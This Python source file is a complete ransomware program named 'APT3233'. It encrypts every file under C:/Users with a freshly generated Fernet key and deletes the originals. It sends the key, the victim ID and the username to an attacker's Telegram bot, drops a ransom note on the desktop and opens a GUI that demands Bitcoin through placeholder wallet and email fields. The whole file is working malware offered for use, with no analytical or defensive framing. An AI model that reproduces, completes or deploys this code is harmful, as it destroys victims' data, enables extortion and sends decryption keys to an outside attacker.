import os
import sys
import errno
import time
import string
import random
import requests
import threading
import errno
from cryptography.fernet import Fernet
from colorama import Fore, Style, init
from datetime import datetime
from tkinter import *
import tkinter as tk
from PIL import ImageTk, Image


init()

def get_random_string(length):
    letters = string.digits
    result_str = "".join(random.choice(letters) for i in range(length))
    return result_str

version = '1.5.4'
errors = []
encryptedfiles = []
decryptedfiles = [] 
now = datetime.now()
logo = os.path.abspath('logo.png')
ID_VICTIM = get_random_string(7)
timestamp = datetime.now().astimezone()
target_directory = r"C:/Users"
current_datetime = '[' + now.strftime("%Y-%m-%d %H:%M:%S.%f") + '] '


key = Fernet.generate_key()
cipher_key = Fernet(key)

    

class Config:
    def __init__(self):
        self.api = 'YOUR_API'
        self.chat_id = 'YOUR_CHAT_ID'
        self.ransomware = True
        self.ransomware_email_address = 'THANK@YOU.COM'
        self.ransomware_btc_wallet_adress = "YOUR_BTC_ADDRESS"
        self.ransomware_amount_of_money = "A MOUNT OF MONEY"
    
    def get_ransomware(self):
        return self.ransomware
    
    def get_ransomeware_email_address(self):
        return self.ransomware_email_address

    def get_ransomware_amount_of_money(self):
        return self.ransomware_amount_of_money

    def get_ransomware_btc_wallet_adress(self):
        return self.ransomware_btc_wallet_adress

cc = Config()

message_to_boss = f"""APT - RANSOMEWARE
Time: {timestamp}
ID VICTIM: {ID_VICTIM}
UserName: {os.getlogin()}
Key: {key}
"""
message_to_victim = f"""
Your computer is now infected with ransomware. Your file are encrypted with a secure algorithm that is impossible to crack.

To recover your files you need a key. This key is generated once your file have been encrypted. To obtain the key, you must purchase it.

You can do this by sending {cc.get_ransomware_amount_of_money()} BTC to this BTC address:
{cc.get_ransomware_btc_wallet_adress()}


Once you have sent the ransom to the btc address you must write an email this this email address: {cc.get_ransomeware_email_address()}

In this email you will include your personal ID so we know who you are. Your personal ID is: {ID_VICTIM}

Once you have completeted all of the steps, you will be provided with the key to decrypt your files.

Don't know how ransomware works? Read up here:


Note: Messing with the ransomware will simply make your files harder to decrypt. Deleting the webhook will make it impossible, as the key can not be generated.

Good luck
"""

def send_wh():
    url = f"https://api.telegram.org/bot{cc.api}/sendMessage"
    params = {'chat_id': cc.chat_id, 'text': message_to_boss}
    
    try:
        response = requests.post(url, params=params)
        if response.status_code != 200:
            sys.exit(1)

    except Exception:
        pass
    
def log_error(e):
    url = f"https://api.telegram.org/bot{cc.api}/sendMessage"
    params = {'chat_id': cc.chat_id, 'text': e}
    
    try:
        response = requests.post(url, params=params)
        if response != 200:
            sys.exit(1)
    except Exception:
        pass

def encrypt_file(file_path):
    encryptedfiles.append(file_path)

    with open (file_path, 'rb') as file:
        file_data = file.read()
        encrypted_data = cipher_key.encrypt(file_data)

    encrypted_file_path = file_path + '.apt3233.encrypted'
    with open(encrypted_file_path, 'wb') as file:
        file.write(encrypted_data)
    
    os.remove(file_path)

def is_encrypted(file_path):
    encrypted_extension = '.apt3233.encrypted'
    encrypted_file_path = file_path + encrypted_extension
    return os.path.exists(encrypted_file_path)

def encrypt_directory(dir_path):
    for root, dir, files in os.walk(dir_path):
        for file in files:
            file_path = os.path.join(root, file)

            try:
                if not is_encrypted(file_path):
                    encrypt_file(file_path)

            except OSError as e:
                if e.errno in (errno.EACCES, errno.EPERM, errno.EINVAL, errno.ENOENT, errno.ENOTDIR, errno.ENAMETOOLONG, errno.EROFS):
                    pass
            except Exception as e:
                if isinstance(e,(
                                  FileNotFoundError,
                                  IsADirectoryError,
                                  TimeoutError
                              )):
                    pass
                else:
                    log_error(e)

def encrypted_files():
    try:
        with open("APT3233-RANSOMEWARE-LISTFILE.txt", "w") as file:
            for encryptedfile in encryptedfiles:
                file.write(encryptedfile + "\n")
    except:
        pass





########
# GUI  #
########    
class GUI:

    def __init__(self, master):

        #main form
        self.master = master
        self.master.geometry('850x690+600+200')
        self.master.title("APT3233 - "+ version)
        self.master.config(bg="#f5f5f5")
        self.master.resizable(False, False)

        # Object IMG 1
        original_image = Image.open(logo)
        resized_image = original_image.resize((200, 200), Image.LANCZOS)

        self.img1 = ImageTk.PhotoImage(resized_image)
        self.Label_img = Label(self.master, image=self.img1, bg='#f5f5f5',
                            relief='flat')
        self.Label_img.place(x=25,y=15)

        # Obj 1
        self.label1 =Label(self.master, text='GameOver', bg='#f5f5f5',
                          fg='#FF0000', font=('bahnschrift', 27, 'bold'))
        self.label1.place(x=450,y=20)

        #Obj 2
        self.label2 = Label(self.master, text='YOUR FILE HAVE BEEN ENCRYPTED !',
                            bg='#f5f5f5', fg='#000000', font=('Arial', 16))
        self.label2.place(x=370, y=80)

        #Obj 3
        self.label3 = Label(self.master, text='Notification: ',
                            bg='#f5f5f5', fg='#000000', font=(22))
        self.label3.place(x=300, y=150)


        #Obj 4
        self.label4= Label(self.master, text='Just send me', bg='#f5f5f5',
                           fg='gray17', font=(18))
        self.label4.place(x=50, y=250)

        #Onj 5
        self.label5 = Label(self.master, text=f'{cc.get_ransomware_amount_of_money()}', bg='#f5f5f5',
                            fg='#000000', font=('Arial', 22, 'bold'))
        self.label5.place(x=90,y=280)


        #Obj 6
        self.label6 = Label(self.master, text='Your ID', bg='#f5f5f5',
                            fg='gray17', font=(18))
        self.label6.place(x=50,y=350)

        #Obj 7
        self.label7 = Label(self.master, text=f'{ID_VICTIM}', bg='#f5f5f5',
                            fg='#000000', font=('Arial', 22, 'bold'))
        self.label7.place(x=90,y=380)

        #Row 1
        self.x1 = Label(self.master, text="Email Address", bg='#f5f5f5', font=('Arial', 10))
        self.x1.place(x=20,y=600)

        self.x2 = Label(self.master, text=f"{cc.get_ransomeware_email_address()}", font=('Arial', 10), wid=68, anchor='w')
        self.x2.place(x=130,y=600)

        self.x3 = Button(self.master, text="Copy", font=('Arial', 10), command=self.copy_email)
        self.x3.place(x=700,y=600)

        #Row 2
        self.y1 = Label(self.master, text="BTC Address", bg='#f5f5f5', font=('Arial', 10))
        self.y1.place(x=20,y=630)

        self.y2 = Label(self.master, text=f"{cc.get_ransomware_btc_wallet_adress()}", font=('Arial', 10), wid=68, anchor='w')
        self.y2.place(x=130,y=630)

        self.y3 = Button(self.master, text="Copy", font=('Arial', 10), command=self.copy_btc_address)
        self.y3.place(x=700,y=630)

        #Button 1
        self.b1 = Button(self.master, text='Decrypt Now', 
                 background='#4CAF50', foreground='#FFFFFF', 
                 font=('Arial', 12, 'bold'), relief='raised', 
                 borderwidth=3, activebackground='#FFA500', 
                 activeforeground='white', 
                 padx=10, pady=7, cursor='hand2',
                 command=self.decryption_button)
        self.b1.place(x=90, y=450)



        #Obj TextBox
        self.text_box = Text(self.master, height=23, width=55)
        self.text_box.config(fg='gray17', bg='#f5f5f5')
        self.text_box.insert(tk.END,    "Your computer is now infected with ransomware.\n"
                                        "Your file are encrypted with a secure algorithm that isimpossible to crack.\n\n"
                                        "To recover your files you need a key. This key is generated once your file have been encrypted. To obtain the key, you must purchase it.\n"
                                        f"You can do this by sending {cc.get_ransomware_amount_of_money()} BTC to this BTC address   "
                                        f"{cc.get_ransomware_btc_wallet_adress()}\n\n"
                                        "Once you have sent the ransom to the btc address you   must write an email this this email address:\n"
                                        f"  {cc.get_ransomeware_email_address()}\n\n"
                                        f"In this email you will include your personal ID so we  know who you are. Your personal ID is: {ID_VICTIM}\n\n"
                                        "Note:\n Messing with the ransomware will simply make your     files harder to decrypt. Deleting this file will make  it impossible, as the key can not be generated.\n\n"
                                        "Good luck")
        self.text_box.configure(state="disabled")
        self.text_box.place(x=300, y=200)

    def decryption_button(self) -> None:
        self.top = Toplevel(self.master)
        self.top.geometry('500x300+200+145')
        self.top.config(bg="gray17")
        self.top.resizable(False, False)

        # Object Label Top Level
        self.top_label = Label(self.top, text="Enter Decryption Key",
                               fg="gold", bg="gray17",
                               font=('bahnschrift', 10))
        self.top_label.place(x=10, y=10)

        # Object TextBox Top Level
        self.text_box2_entry = Entry(self.top ,width=60)
        self.text_box2_entry.grid(padx=20, pady=40)
        self.text_box2_entry.bind("<Return>", lambda event: self.toplevel2())


        # Object Button Validation Top Level
        self.b_val = Button(self.top, text="Start", width=8,
                            cursor='hand2', activebackground='#FFA500',
                            command=self.toplevel2)
        self.b_val.place(x=410, y=38)
     
        

    def toplevel2(self):
        def show_process(text_box, message):
            if message == 'Password Error..':
                text_box.config(fg='#FF0000', state='normal')
            else:
                text_box.config(fg='#00FFFF', state='normal') 

            text_box.insert(tk.END, message + '\n')


        def decrypt_file(file_path, cipher_suite):
            try:
                decryptedfiles.append(file_path)

                with open(file_path, 'rb') as encrypted_file:
                    encrypted_data = encrypted_file.read()
                    decrypted_data = cipher_suite.decrypt(encrypted_data)

                decrypted_file_path = file_path.rsplit('.apt3233.encrypted', 1)[0]
                with open(decrypted_file_path, 'wb') as decrypted_file:
                    decrypted_file.write(decrypted_data)

                os.remove(file_path)
            except Exception as e:
                errors.append(str(e))

        def decrypted_files():
            try:
                with open('APT3233-RANSOMWARE-DECRYPTED-FILES.txt', 'w') as file:
                    for decryptedfile in decryptedfiles:
                        file.write(decryptedfile + '\n')
            except Exception as e:
                errors.append(str(e))

        def log_error_2():
            try:
                with open('APT-RANSOMWARE-ERRORS.txt', 'w') as file:
                    for error in errors:
                        file.write(error + '\n')
            except Exception as e:
                print(Fore.RED + Style.DIM + current_datetime + 'Really bad error occured. Please directly report to head developer.')


            

        # Display Process
        self.text_box_2 = Text(self.top, height=13, width=60)
        self.text_box_2.config(fg='white', bg='gray17')
        self.text_box_2.place(x=10, y=70)

        show_process(self.text_box_2, "Decryption started...")

        self.user_input = self.text_box2_entry.get()

        global cipher_suite

        try:

            cipher_suite = Fernet(self.user_input)
            
            
            show_process(self.text_box_2, "Waiting...")

            for root, dirs, files in os.walk(target_directory):
                for file in files:
                    file_path = os.path.join(root, file)
                    try:
                        decrypt_file(file_path, cipher_suite)

                    except OSError as e:
                        if e.errno in (errno.EACCES, errno.EPERM, errno.EINVAL, errno.ENOENT,
                                    errno.ENOTDIR, errno.ENAMETOOLONG, errno.EROFS):
                            pass  
                    except Exception as e:
                        if isinstance(e, (FileNotFoundError, IsADirectoryError, TimeoutError,)):
                            pass  
                        else:
                            errors.append(str(e))

            decrypted_files()

            show_process(self.text_box_2, "DONE.")
            

        except ValueError:
            show_process(self.text_box_2, "Password Error..")
        except Exception as e:
            show_process(self.text_box_2, "Password Error..")
            errors.append(str(e))
            log_error_2()


    

    def copy_email(self):
        email = f"{cc.get_ransomeware_email_address()}"
        root.clipboard_clear()
        root.clipboard_append(email)
        root.update()

    def copy_btc_address(self):
        btc_address = f"{cc.get_ransomware_btc_wallet_adress()}"
        root.clipboard_clear()
        root.clipboard_append(btc_address)
        root.update()

def ransomeware():
    send_wh()
    encrypt_directory(target_directory)
    encrypted_files()

    desktop = os.path.join(os.path.join(os.environ["USERPROFILE"]), "Desktop")
    file_path = os.path.join(desktop, "APT3233-RANSOMEWARE-NOTE.txt")
    with open(file_path, 'w') as file:
        file.write(message_to_victim)
    
    
    # os.startfile(file_path)

if cc.get_ransomware():
    try:
        threading.Thread(target=ransomeware(), name='AppSecure').start()
    
        root = Tk()
        main = GUI(root)
        root.mainloop()

    except Exception as e:
        log_error(e)

